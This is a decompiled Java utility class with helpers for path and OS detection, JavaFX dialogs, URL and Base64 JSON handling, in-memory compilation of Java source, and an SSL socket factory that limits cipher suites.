    public static boolean isWindowsPath(String path) {
        return path.length() > 1 && path.substring(0, 2).matches("^[a-zA-Z]:");
    }

    public static String getRootPath(String path) {
        String rootPath = "/";
        if (isWindowsPath(path)) {
            rootPath = formatPath(path.substring(0, 2));
        }

        return rootPath;
    }

    public static String getContextPath(String url) {
        String result = "/";

        try {
            URI u = new URI(url);
            String path = u.normalize().getPath();
            if (path.startsWith("/")) {
                path = path.substring(1);
            }

            int pos = path.indexOf("/");
            if (pos > 0) {
                result = "/" + path.substring(0, pos + 1);
            }
        } catch (Exception var5) {
        }

        return result;
    }

    public static boolean isWindows(Map<String, String> basicInfoMap) {
        String osInfo = (String)basicInfoMap.get("osInfo");
        return osInfo.indexOf("windows") >= 0 || osInfo.indexOf("winnt") >= 0;
    }

    public static int getOSType(String osInfo) {
        int osType = -1;
        if (osInfo.indexOf("windows") < 0 && osInfo.indexOf("winnt") < 0) {
            if (osInfo.indexOf("linux") >= 0) {
                osType = Constants.OS_TYPE_LINUX;
            } else if (osInfo.indexOf("mac") >= 0) {
                osType = Constants.OS_TYPE_MAC;
            }
        } else {
            osType = Constants.OS_TYPE_WINDOWS;
        }

        return osType;
    }

    public static void showErrorMessage(String title, String msg) {
        Alert alert = getAlert(AlertType.ERROR);
        alert.setTitle(title);
        alert.setHeaderText("");
        alert.setContentText(msg);
        alert.show();
    }

    public static void showInfoMessage(String title, String msg) {
        Alert alert = getAlert(AlertType.INFORMATION);
        alert.setTitle(title);
        alert.setHeaderText("");
        alert.setContentText(msg);
        alert.show();
    }

    public static Optional<ButtonType> showConfirmMessage(String title, String msg) {
        Alert confirmDialog = getAlert(AlertType.CONFIRMATION);
        confirmDialog.setResizable(true);
        confirmDialog.setHeaderText("");
        confirmDialog.setTitle(title);
        confirmDialog.setContentText(msg);
        Optional<ButtonType> result = confirmDialog.showAndWait();
        return result;
    }

    public static String showInputBox(String title, String header, String inputLabel, String defaultValue) {
        Alert alert = new Alert(AlertType.INFORMATION);
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((event) -> window.hide());
        alert.setTitle(title);
        alert.setHeaderText(header);
        TextField inputText = new TextField(defaultValue);
        GridPane inputPane = new GridPane();
        inputPane.setMaxWidth(Double.MAX_VALUE);
        inputPane.add(new Label(inputLabel), 0, 0);
        inputPane.add(inputText, 1, 0);
        inputPane.setHgap((double)20.0F);
        alert.getDialogPane().setContent(inputPane);
        alert.setResult((ButtonType) null);
        Optional<ButtonType> result = alert.showAndWait();
        if (result.isPresent()) {
            String inputValue = inputText.getText().trim();
            return inputValue;
        } else {
            return null;
        }
    }

    public static String getOrDefault(JSONObject obj, String key, Class type) {
        String result = "";
        if (obj.has(key)) {
            result = obj.get(key).toString();
        } else if (type == String.class) {
            result = "";
        } else if (type == Integer.TYPE) {
            result = "0";
        }

        return result;
    }

    public static String getBaseUrl(String urlStr) {
        String result = urlStr;

        try {
            URL url = new URL(urlStr);
            int port = url.getPort();
            if (port == -1) {
                result = url.getProtocol() + "://" + url.getHost();
            } else {
                result = url.getProtocol() + "://" + url.getHost() + ":" + url.getPort();
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }

        return result;
    }

    public static byte[] replaceBytes(byte[] src, byte[] find, byte[] replace) {
        String replaced = cutBrackets(Arrays.toString(src)).replace(cutBrackets(Arrays.toString(find)), cutBrackets(Arrays.toString(replace)));
        return (byte[])Arrays.stream(replaced.split(", ")).map(Byte::valueOf).collect(toByteArray());
    }

    private static String cutBrackets(String s) {
        return s.substring(1, s.length() - 1);
    }

    private static Collector<Byte, ?, byte[]> toByteArray() {
        return Collector.of(ByteArrayOutputStream::new, ByteArrayOutputStream::write, (baos1, baos2) -> {
            try {
                baos2.writeTo(baos1);
                return baos1;
            } catch (IOException e) {
                throw new UncheckedIOException(e);
            }
        }, ByteArrayOutputStream::toByteArray);
    }

    public static JSONObject JsonAndDecode(String jsonStr) {
        JSONObject jsonObject = new JSONObject(jsonStr);

        for(String key : jsonObject.keySet()) {
            jsonObject.put(key, new String(Base64.getDecoder().decode(jsonObject.getString(key))));
        }

        return jsonObject;
    }

    public static JSONObject DecodeJsonObj(JSONObject jsonObj) {
        for(String key : jsonObj.keySet()) {
            jsonObj.put(key, new String(Base64.getDecoder().decode(jsonObj.getString(key))));
        }

        return jsonObj;
    }

    public static <T> T[] appendArray(T[] arr, T value) {
        int oldLength = arr.length;
        T[] newArr = (T[])Arrays.copyOf(arr, arr.length + 1);
        newArr[oldLength] = value;
        return newArr;
    }

    public static JSONObject DecodeAndJson(String jsonStr) {
        String decodedJson = new String(Base64.getDecoder().decode(jsonStr));
        JSONObject jsonObject = new JSONObject(decodedJson);
        return jsonObject;
    }

    public static Object getLastOfList(List list) {
        int size = list.size();
        return list.get(size - 1);
    }

    public static int getUrlPort(URL url) {
        int port = url.getPort();
        if (port == -1) {
            port = url.getDefaultPort();
        }

        return port;
    }

    public static class MyJavaFileObject extends SimpleJavaFileObject {
        private String source;
        private ByteArrayOutputStream outPutStream;

        public MyJavaFileObject(String name, String source) {
            super(URI.create("String:///" + name + Kind.SOURCE.extension), Kind.SOURCE);
            this.source = source;
        }

        public MyJavaFileObject(String name, Kind kind) {
            super(URI.create("String:///" + name + kind.extension), kind);
            this.source = null;
        }

        public CharSequence getCharContent(boolean ignoreEncodingErrors) {
            if (this.source == null) {
                throw new IllegalArgumentException("source == null");
            } else {
                return this.source;
            }
        }

        public OutputStream openOutputStream() throws IOException {
            this.outPutStream = new ByteArrayOutputStream();
            return this.outPutStream;
        }

        public byte[] getCompiledBytes() {
            return this.outPutStream.toByteArray();
        }
    }

    private static class MySSLSocketFactory extends SSLSocketFactory {
        private SSLSocketFactory sf;
        private String[] enabledCiphers;

        private MySSLSocketFactory(SSLSocketFactory sf, String[] enabledCiphers) {
            this.sf = null;
            this.enabledCiphers = null;
            this.sf = sf;
            this.enabledCiphers = enabledCiphers;
        }

        private Socket getSocketWithEnabledCiphers(Socket socket) {
            if (this.enabledCiphers != null && socket != null && socket instanceof SSLSocket) {
                ((SSLSocket)socket).setEnabledCipherSuites(this.enabledCiphers);
            }

            return socket;
        }

        public Socket createSocket(Socket s, String host, int port, boolean autoClose) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(s, host, port, autoClose));
        }

        public String[] getDefaultCipherSuites() {
            return this.sf.getDefaultCipherSuites();
        }

        public String[] getSupportedCipherSuites() {
            return this.enabledCiphers == null ? this.sf.getSupportedCipherSuites() : this.enabledCiphers;
        }

        public Socket createSocket(String host, int port) throws IOException, UnknownHostException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port));
        }

        public Socket createSocket(InetAddress address, int port) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port));
        }

        public Socket createSocket(String host, int port, InetAddress localAddress, int localPort) throws IOException, UnknownHostException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port, localAddress, localPort));
        }

        public Socket createSocket(InetAddress address, int port, InetAddress localaddress, int localport) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port, localaddress, localport));
        }
    }

    public static class MyJavaFileManager extends ForwardingJavaFileManager<JavaFileManager> {
        protected MyJavaFileManager(JavaFileManager fileManager) {
            super(fileManager);
        }

        public JavaFileObject getJavaFileForInput(Location location, String className, Kind kind) throws IOException {
            JavaFileObject javaFileObject = (JavaFileObject)Utils.fileObjects.get(className);
            if (javaFileObject == null) {
                super.getJavaFileForInput(location, className, kind);
            }

            return javaFileObject;
        }

        public JavaFileObject getJavaFileForOutput(Location location, String qualifiedClassName, Kind kind, FileObject sibling) throws IOException {
            JavaFileObject javaFileObject = new MyJavaFileObject(qualifiedClassName, kind);
            Utils.fileObjects.put(qualifiedClassName, javaFileObject);
            return javaFileObject;
        }
    }
}
